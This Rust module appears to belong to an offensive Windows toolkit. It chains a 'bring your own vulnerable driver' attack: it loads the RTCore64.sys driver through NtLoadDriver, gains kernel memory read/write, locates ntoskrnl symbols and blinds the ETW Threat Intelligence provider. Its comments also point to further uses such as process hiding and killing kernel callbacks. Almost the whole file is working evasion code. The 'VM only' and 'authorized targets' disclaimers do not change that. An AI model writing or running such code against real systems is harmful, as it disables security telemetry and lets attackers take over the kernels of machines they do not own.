//! Windows-specific kernel-tier implementation — the `win/` shell.
//!
//! This module holds the Windows-only glue that turns the platform-agnostic
//! algorithms (etwti, byovd, telemetry, persistence, netsec) into a working
//! kernel-tier toolkit:
//!
//! - [`resolve`] — GetModuleHandleA + GetProcAddress real binding (replaces
//!   the stub in byovd.rs).
//! - [`driver_load`] — NtLoadDriver bootstrap (registry key + ImagePath + load).
//! - [`kernel_base`] — ntoskrnl base via NtQuerySystemInformation.
//! - [`pagewalk`] — x64 4-level page-table walk (VA→PA, pure + unit-tested).
//! - [`va_rw`] — VA-aware KernelRw over a physical driver + page walk.
//!
//! ## Full bootstrap chain
//! ```text
//!   operator: bootstrap_byovd("RTCore64.sys", "RTCore64")
//!     → driver_load::LoadedDriver::load   (registry + NtLoadDriver)
//!     → byovd::ByovdDriver::open          (CreateFileW on \\.\RTCore64)
//!     → kernel_base::ntoskrnl_base()      (NtQuerySystemInformation)
//!     → resolve_kernel_symbol(ntoskrnl, "EtwThreatIntProvRegHandle")
//!     → etwti::EtwTiBlind::blind(krw)     (the algorithm runs)
//! ```
//!
//! ## Safety / risk
//! Loading a driver is irreversible (until NtUnloadDriver) and changes kernel
//! state. A wrong kernel write bugchecks. Test on a VM. Only authorized targets.

#![cfg(target_os = "windows")]

pub mod resolve;
pub mod driver_load;
pub mod kernel_base;
pub mod pagewalk;
pub mod va_rw;

use crate::{EtwTiKit, KernelRw, KitError};
use crate::etwti::{EtwTiBlind, EtwTiOffsets};
use crate::byovd::{ByovdDriver, VulnDriverIoctl, RtCore64};
use alloc::boxed::Box;

/// The full BYOVD bootstrap: load driver → open device → return KernelRw.
///
/// `sys_path` = UTF-16 path to the .sys file on disk (e.g. `C:\temp\RTCore64.sys`).
/// `svc_name` = the service name for the registry key (e.g. `RTCore64`).
///
/// Returns the loaded driver (for cleanup) + the ByovdDriver KernelRw.
///
/// # Safety
/// Loads a driver into the kernel. BSOD risk. Caller must have
/// SeLoadDriverPrivilege. Test on a VM.
pub unsafe fn bootstrap_byovd(
    sys_path: &[u16],
    svc_name: &[u16],
) -> Result<(driver_load::LoadedDriver, ByovdDriver), KitError> {
    // 1. Load the driver.
    let loaded = unsafe { driver_load::LoadedDriver::load(sys_path, svc_name) }
        .map_err(|e| KitError::Other(alloc::format!("driver load: {}", e)))?;

    // 2. Open the device (CreateFileW on \\.\RTCore64).
    let driver: Box<dyn VulnDriverIoctl> = Box::new(RtCore64);
    let krw = match unsafe { ByovdDriver::open(driver) } {
        Ok(k) => k,
        Err(e) => {
            // Cleanup: unload the driver before propagating the error.
            let mut l = loaded;
            l.unload();
            return Err(KitError::NoPrimitive(e));
        }
    };

    Ok((loaded, krw))
}

/// Blind ETW-TI end-to-end: bootstrap BYOVD → resolve handle → blind.
///
/// Convenience: does the full chain in one call. Returns the loaded driver +
/// the KernelRw (for further operations like process hiding / callback kill).
///
/// # Safety
/// Loads a driver + writes kernel memory. BSOD risk. VM only.
pub unsafe fn blind_etw_ti_full(
    sys_path: &[u16],
    svc_name: &[u16],
    prov_reg_handle_kva: usize,
    offsets: EtwTiOffsets,
) -> Result<(driver_load::LoadedDriver, ByovdDriver), KitError> {
    let (mut loaded, krw) = unsafe { bootstrap_byovd(sys_path, svc_name) }?;
    let kit = EtwTiBlind { prov_reg_handle_kva, offsets };
    match kit.blind(&krw) {
        Ok(()) => Ok((loaded, krw)),
        Err(e) => {
            loaded.unload();
            Err(e)
        }
    }
}
